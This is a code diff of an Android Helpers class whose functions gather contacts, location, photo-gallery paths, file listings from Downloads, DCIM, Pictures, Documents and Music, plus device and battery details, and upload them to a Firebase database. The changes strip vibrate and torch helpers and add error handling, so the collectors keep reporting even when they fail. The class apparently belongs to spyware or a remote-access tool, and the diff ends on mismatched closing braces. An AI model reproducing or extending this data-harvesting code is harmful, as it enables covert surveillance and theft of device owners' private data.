@@ -13,15 +13,11 @@ import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.StatFs;
-import android.os.VibrationEffect;
-import android.os.Vibrator;
+import android.location.Location;
+import android.location.LocationManager;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
-import android.location.Location;
-import android.location.LocationManager;
-import android.util.DisplayMetrics;
-import android.view.WindowManager;
 import androidx.core.content.ContextCompat;
 import com.google.firebase.database.DatabaseReference;
 import java.io.File;
@@ -31,20 +27,6 @@ import java.util.List;
 import java.util.Map;
 
 public class Helpers {
-
-    public static void vibrate(Context ctx) {
-        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-            v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
-        else v.vibrate(1000);
-    }
-
-    public static void torch(Context ctx, boolean on) {
-        try {
-            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
-            cm.setTorchMode(cm.getCameraIdList()[0], on);
-        } catch (Exception e) {}
-    }
 
     public static void pushContacts(Context ctx, DatabaseReference ref) {
         List<Map<String, Object>> list = new ArrayList<>();
@@ -160,17 +142,12 @@ public class Helpers {
         info.put("storageTotal", human(total));
         info.put("storageAvailable", human(avail));
 
-        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
-        DisplayMetrics dm = new DisplayMetrics();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) ctx.getDisplay().getRealMetrics(dm);
-        else wm.getDefaultDisplay().getRealMetrics(dm);
-        info.put("screenResolution", dm.widthPixels + "x" + dm.heightPixels);
-
         info.put("bootloader", Build.BOOTLOADER);
         info.put("host", Build.HOST);
         info.put("time", Build.TIME);
         info.put("model", Build.MODEL);
         info.put("manufacturer", Build.MANUFACTURER);
+        info.put("androidVersion", Build.VERSION.RELEASE);
 
         ref.child("systemInfo").setValue(info);
     }
@@ -185,16 +162,22 @@ public class Helpers {
     }
 
     public static void pushBattery(Context ctx, DatabaseReference ref) {
-        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent bs = ctx.registerReceiver(null, ifilter);
-        if (bs == null) { ref.child("battery").setValue("unknown"); return; }
-        int level = bs.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-        int scale = bs.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-        int pct = (int) ((level / (float) scale) * 100);
-        Map<String, Object> m = new HashMap<>();
-        m.put("percent", pct);
-        m.put("timestamp", System.currentTimeMillis());
-        ref.child("battery").setValue(m);
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent bs = ctx.registerReceiver(null, ifilter);
+            if (bs == null) { ref.child("battery").setValue("unknown"); return; }
+            int level = bs.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            int scale = bs.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+            int pct = (int) ((level / (float) scale) * 100);
+            int status = bs.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+            Map<String, Object> m = new HashMap<>();
+            m.put("percent", pct);
+            m.put("status", status);
+            m.put("timestamp", System.currentTimeMillis());
+            ref.child("battery").setValue(m);
+        } catch (Exception e) {
+            ref.child("battery").setValue("error: " + e.getMessage());
+        }
     }
 
     public static void pushLocation(Context ctx, DatabaseReference ref) {
@@ -223,53 +206,61 @@ public class Helpers {
 
     public static void pushGallery(Context ctx, DatabaseReference ref) {
         List<Map<String, Object>> list = new ArrayList<>();
-        Cursor c = ctx.getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
-                MediaStore.Images.Media.DATE_ADDED + " DESC");
-        if (c != null) {
-            int pathI = c.getColumnIndex(MediaStore.Images.Media.DATA);
-            int dateI = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
-            int sizeI = c.getColumnIndex(MediaStore.Images.Media.SIZE);
-            int n = 0;
-            while (c.moveToNext() && n < 100) {
-                Map<String, Object> m = new HashMap<>();
-                m.put("path", c.getString(pathI));
-                m.put("date", c.getLong(dateI));
-                m.put("size", c.getLong(sizeI));
-                list.add(m);
-                n++;
+        try {
+            Cursor c = ctx.getContentResolver().query(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
+                    MediaStore.Images.Media.DATE_ADDED + " DESC");
+            if (c != null) {
+                int pathI = c.getColumnIndex(MediaStore.Images.Media.DATA);
+                int dateI = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
+                int sizeI = c.getColumnIndex(MediaStore.Images.Media.SIZE);
+                int n = 0;
+                while (c.moveToNext() && n < 100) {
+                    Map<String, Object> m = new HashMap<>();
+                    m.put("path", c.getString(pathI));
+                    m.put("date", c.getLong(dateI));
+                    m.put("size", c.getLong(sizeI));
+                    list.add(m);
+                    n++;
+                }
+                c.close();
             }
-            c.close();
+            ref.child("gallery").setValue(list);
+        } catch (Exception e) {
+            ref.child("gallery").setValue("error: " + e.getMessage());
         }
-        ref.child("gallery").setValue(list);
     }
 
     public static void pushFiles(Context ctx, DatabaseReference ref) {
         List<Map<String, Object>> list = new ArrayList<>();
-        File[] dirs = {
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
-        };
-        for (File dir : dirs) {
-            if (dir != null && dir.exists()) {
-                File[] files = dir.listFiles();
-                if (files != null) {
-                    for (File f : files) {
-                        if (list.size() >= 200) break;
-                        Map<String, Object> m = new HashMap<>();
-                        m.put("name", f.getName());
-                        m.put("path", f.getAbsolutePath());
-                        m.put("size", f.length());
-                        m.put("isDir", f.isDirectory());
-                        m.put("modified", f.lastModified());
-                        list.add(m);
+        try {
+            File[] dirs = {
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
+            };
+            for (File dir : dirs) {
+                if (dir != null && dir.exists()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            if (list.size() >= 200) break;
+                            Map<String, Object> m = new HashMap<>();
+                            m.put("name", f.getName());
+                            m.put("path", f.getAbsolutePath());
+                            m.put("size", f.length());
+                            m.put("isDir", f.isDirectory());
+                            m.put("modified", f.lastModified());
+                            list.add(m);
+                        }
                     }
                 }
             }
+            ref.child("files").setValue(list);
+        } catch (Exception e) {
+            ref.child("files").setValue("error: " + e.getMessage());
         }
-        ref.child("files").setValue(list);
     }
-            }
+                    }
